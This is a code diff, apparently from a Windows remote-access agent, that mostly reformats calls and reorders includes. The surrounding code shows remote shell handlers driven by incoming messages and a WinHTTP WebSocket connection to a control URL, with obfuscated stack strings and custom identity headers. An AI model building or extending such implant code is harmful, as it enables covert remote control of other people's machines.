@@ -1,21 +1,18 @@
 #include "winhttp_api.h"
-
-#include "string.h"
 #include "protocol.h"
 #include "wire.h"
 #include "transport.h"
 #include "shell.h"
 #include "report.h"
-#include "system_facts.h"
 #include "identity_headers.h"
 #include "types.h"
 #include "wintypes.h"
 #include "memory.h"
+#include "string.h"
 #include "logger.h"
 #include "kernel32.h"
 #include "entry.h"
 #include "stackstrings.h"
-#include "environment.h"
 
 typedef struct {
     shell_slot *shells;
@@ -55,8 +52,8 @@ static DWORD handle_open_shell(const agent_ctx *ctx, unsigned int corr_id,
 }
 
 static DWORD handle_write_shell(const agent_ctx *ctx, const incoming_message *msg,
-                                    unsigned int corr_id,
-                                    unsigned char *reply, DWORD *reply_len)
+                                unsigned int corr_id,
+                                unsigned char *reply, DWORD *reply_len)
 {
     unsigned long long id = 0;
     for (int i = 12; i >= 5; i--)
@@ -65,7 +62,6 @@ static DWORD handle_write_shell(const agent_ctx *ctx, const incoming_message *ms
     shell_slot *slot = shell_lookup(ctx->shells, id);
     int status = STATUS_ERROR;
     if (slot) {
-
         DWORD end = msg->length;
         while (end > 13 && msg->data[end - 1] == '\0')
             end--;
@@ -82,8 +78,8 @@ static DWORD handle_write_shell(const agent_ctx *ctx, const incoming_message *ms
 }
 
 static DWORD handle_read_shell(const agent_ctx *ctx, const incoming_message *msg,
-                                   unsigned int corr_id,
-                                   unsigned char *reply, DWORD *reply_len)
+                               unsigned int corr_id,
+                               unsigned char *reply, DWORD *reply_len)
 {
     unsigned long long id = 0;
     for (int i = 12; i >= 5; i--)
@@ -126,8 +122,8 @@ static DWORD handle_read_shell(const agent_ctx *ctx, const incoming_message *msg
 }
 
 static DWORD handle_close_shell(const agent_ctx *ctx, const incoming_message *msg,
-                                    unsigned int corr_id,
-                                    unsigned char *reply, DWORD *reply_len)
+                                unsigned int corr_id,
+                                unsigned char *reply, DWORD *reply_len)
 {
     unsigned long long id = 0;
     for (int i = 12; i >= 5; i--)
@@ -243,9 +239,7 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
 
     WCHAR ua_buf[18];
     StrUserAgent(ua_buf);
-    session = winhttp.WinHttpOpen(ua_buf,
-                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    session = winhttp.WinHttpOpen(ua_buf, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!session) { LOG_ERROR("WinHttpOpen failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
 
     connection = winhttp.WinHttpConnect(session, uc.lpszHostName, uc.nPort, 0);
@@ -255,13 +249,10 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
     if (https) request_flags |= WINHTTP_FLAG_SECURE;
     WCHAR get_buf[4];
     StrGetMethodW(get_buf);
-    request = winhttp.WinHttpOpenRequest(connection, get_buf, uc.lpszUrlPath, NULL,
-                                 WINHTTP_NO_REFERER,
-                                 WINHTTP_DEFAULT_ACCEPT_TYPES, request_flags);
+    request = winhttp.WinHttpOpenRequest(connection, get_buf, uc.lpszUrlPath, NULL, NULL, NULL, request_flags);
     if (!request) { LOG_ERROR("WinHttpOpenRequest failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
 
-    if (!winhttp.WinHttpSetOption(request, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET,
-                          NULL, 0)) {
+    if (!winhttp.WinHttpSetOption(request, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0)) {
         LOG_ERROR("winhttp.WinHttpSetOption(UPGRADE_TO_WEB_SOCKET) failed: %lu\n", kernel32.GetLastError());
         goto cleanup;
     }
@@ -282,9 +273,7 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
     LOG_INFO("Identity: %lu header bytes on the upgrade request\n",
            (unsigned long)headers_len);
 
-    if (!winhttp.WinHttpSendRequest(request, headers_w,
-                          (DWORD)headers_len,
-                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
+    if (!winhttp.WinHttpSendRequest(request, headers_w,(DWORD)headers_len, NULL, 0, 0, 0)) {
         LOG_ERROR("WinHttpSendRequest failed: %lu\n", kernel32.GetLastError()); goto cleanup;
     }
 
